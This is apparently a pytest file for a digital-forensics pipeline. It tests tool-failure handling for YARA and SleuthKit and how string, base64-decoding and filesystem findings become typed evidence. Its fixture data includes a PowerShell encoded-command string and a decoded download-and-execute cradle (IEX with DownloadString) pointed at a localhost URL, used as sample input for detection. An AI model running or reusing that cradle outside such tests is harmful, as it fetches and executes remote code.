import json
from pathlib import Path

from sift_sentinel.analysis.evidence_db import build_typed_evidence_db
from sift_sentinel.coordinator import collect_tool_failures


def test_not_applicable_yara_and_sleuthkit_are_not_tool_failures():
    outputs = {
        "run_yara": {
            "status": "not_applicable",
            "failure_mode": "rules_not_configured",
            "reason": "no_yara_rules_available",
            "record_count": 0,
            "output": [],
        },
        "sleuthkit_fls": {
            "kind": "not_applicable",
            "status": "not_applicable",
            "failure_mode": "disk_image_not_provided",
            "reason": "disk image missing",
            "record_count": 0,
            "output": [],
        },
        "sleuthkit_mactime": {
            "kind": "not_applicable",
            "status": "not_applicable",
            "failure_mode": "body_file_not_provided",
            "reason": "body file missing",
            "record_count": 0,
            "output": [],
        },
        "real_bad_tool": {
            "failure_mode": "runtime_error",
            "error": "boom",
            "record_count": 0,
            "output": [],
        },
    }
    failures = collect_tool_failures(outputs)
    assert [f["tool"] for f in failures] == ["real_bad_tool"]


def test_evidence_db_registers_zero_contrib_tool_families():
    db = build_typed_evidence_db(
        {
            "run_strings": {
                "record_count": 3,
                "output": [
                    "boring hardware string",
                    "powershell.exe -nop -enc AAAA",
                    "http://127.0.0.1:9506/a",
                ],
            },
            "decode_base64_strings": {
                "record_count": 2,
                "output": [
                    {
                        "source_tool": "run_strings",
                        "source_record": 1,
                        "original_preview": "SQBFAFgA",
                        "decoded_preview": "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9506/a')",
                        "encoding": "utf-16-le",
                        "suspicious_keywords": ["iex", "downloadstring"],
                        "confidence": "high",
                    },
                    {
                        "source_tool": "run_strings",
                        "source_record": 2,
                        "original_preview": "abcd",
                        "decoded_preview": "plain decoded observation",
                        "encoding": "utf-8",
                        "suspicious_keywords": [],
                        "confidence": "low",
                    },
                ],
            },
            "run_yara": {
                "record_count": 1,
                "output": [{"rule": "SUSP_TEST", "target": "sample.bin"}],
            },
            "sleuthkit_fls": {
                "record_count": 1,
                "output": ["r/r 123: C:/Windows/Temp/p.exe"],
            },
            "sleuthkit_mactime": {
                "record_count": 1,
                "output": ["2018-09-07T21:11:46Z|C:/Windows/Temp/p.exe|m"],
            },
        },
        reference_set={},
    )

    typed = db["typed_facts"]
    assert len(typed["string_artifact_fact"]) >= 2
    assert len(typed["decoded_string_fact"]) == 2
    assert len(typed["yara_match_fact"]) == 1
    assert len(typed["filesystem_listing_fact"]) == 1
    assert len(typed["filesystem_timeline_fact"]) == 1

    totals = db["coverage"]["per_tool"]
    assert totals["run_strings"]["emitted_fact_count"] >= 2
    assert totals["decode_base64_strings"]["emitted_fact_count"] == 2
    assert totals["run_yara"]["emitted_fact_count"] == 1
    assert totals["sleuthkit_fls"]["emitted_fact_count"] == 1
    assert totals["sleuthkit_mactime"]["emitted_fact_count"] == 1


def test_static_markers_for_sleuthkit_and_safe_path_guards():
    rp = Path("run_pipeline.py").read_text()
    coord = Path("src/sift_sentinel/coordinator.py").read_text()
    evdb = Path("src/sift_sentinel/analysis/evidence_db.py").read_text()

    assert "31V: normalize absent evidence paths" in rp
    assert "SleuthKit image/body-file guards" in coord
    assert "disk_image_not_provided" in coord
    assert "body_file_not_provided" in coord
    assert '"run_strings": _c_strings' in evdb
    assert '"decode_base64_strings": _c_decoded_strings' in evdb
